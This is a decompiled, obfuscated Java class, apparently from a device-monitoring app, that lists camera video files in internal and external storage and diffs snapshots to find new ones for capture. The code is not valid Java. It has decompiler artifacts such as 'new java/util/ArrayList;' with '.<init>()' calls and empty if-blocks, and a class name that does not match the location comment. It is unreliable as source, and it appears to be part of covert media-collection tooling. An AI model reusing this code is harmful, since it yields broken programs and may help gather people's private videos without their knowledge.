package com.vvt.capture.camera.video.a;

import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.camera.video.CameraVideoReference;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private String b;
  
  public b(String paramString)
  {
    this.b = paramString;
  }
  
  public g a()
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    Object localObject3 = a.a();
    boolean bool1 = com.vvt.ag.b.a((String)localObject3);
    if (!bool1) {
      localObject1 = a.a((String)localObject3);
    }
    localObject3 = a.b();
    bool1 = com.vvt.ag.b.a((String)localObject3);
    if (!bool1) {
      localObject2 = a.a((String)localObject3);
    }
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    localObject3 = new java/util/HashMap;
    ((HashMap)localObject3).<init>();
    ((HashMap)localObject3).put("external", localObject1);
    ((HashMap)localObject3).put("internal", localObject2);
    localObject1 = new com/vvt/capture/camera/video/CameraVideoReference;
    ((CameraVideoReference)localObject1).<init>();
    ((CameraVideoReference)localObject1).setReference((HashMap)localObject3);
    return (g)localObject1;
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    ArrayList localArrayList2 = new java/util/ArrayList;
    localArrayList2.<init>();
    new ArrayList();
    bool1 = false;
    Object localObject = null;
    boolean bool3 = a;
    if (bool3) {}
    String str1 = a.a();
    boolean bool6 = com.vvt.ag.b.a(str1);
    String str2;
    if (!bool6)
    {
      localObject = a.a(str1, paramInt);
      str2 = this.b;
      localObject = a.a(str2, str1, localArrayList2, (List)localObject);
      if (localObject != null)
      {
        int j = ((List)localObject).size();
        if (j > 0) {
          localArrayList1.addAll((Collection)localObject);
        }
      }
    }
    boolean bool4 = a;
    if (bool4) {}
    int k = ((List)localObject).size();
    if (k < paramInt)
    {
      boolean bool5 = a;
      if (bool5) {}
      str1 = a.b();
      bool6 = com.vvt.ag.b.a(str1);
      if (!bool6)
      {
        int i = ((List)localObject).size();
        i = paramInt - i;
        localObject = a.a(str1, i);
        str2 = this.b;
        localObject = a.a(str2, str1, localArrayList2, (List)localObject);
        if (localObject != null)
        {
          int m = ((List)localObject).size();
          if (m > 0) {
            localArrayList1.addAll((Collection)localObject);
          }
        }
      }
      bool2 = a;
      if (!bool2) {}
    }
    boolean bool2 = a;
    if (bool2) {}
    return localArrayList1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool = paramg1 instanceof CameraVideoReference;
    if (bool)
    {
      bool = paramg2 instanceof CameraVideoReference;
      if (bool)
      {
        paramg1 = (CameraVideoReference)paramg1;
        Object localObject1 = paramg1.getReference();
        paramg2 = (CameraVideoReference)paramg2;
        HashMap localHashMap = paramg2.getReference();
        new ArrayList();
        new ArrayList();
        Object localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        bool = a;
        if (bool) {}
        String str1 = a.b();
        bool = com.vvt.ag.b.a(str1);
        List localList;
        int i;
        if (!bool)
        {
          localObject2 = (List)((HashMap)localObject1).get("internal");
          localList = (List)localHashMap.get("internal");
          String str2 = this.b;
          localObject2 = a.a(str2, str1, (List)localObject2, localList);
          if (localObject2 != null)
          {
            i = ((List)localObject2).size();
            if (i > 0) {
              localArrayList.addAll((Collection)localObject2);
            }
          }
        }
        bool = a;
        if (bool) {}
        bool = a;
        if (bool) {}
        str1 = a.a();
        bool = com.vvt.ag.b.a(str1);
        if (!bool)
        {
          localObject2 = (List)((HashMap)localObject1).get("external");
          localList = (List)localHashMap.get("external");
          localObject1 = this.b;
          localObject2 = a.a((String)localObject1, str1, (List)localObject2, localList);
          if (localObject2 != null)
          {
            i = ((List)localObject2).size();
            if (i > 0) {
              localArrayList.addAll((Collection)localObject2);
            }
          }
        }
        bool = a;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/video/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */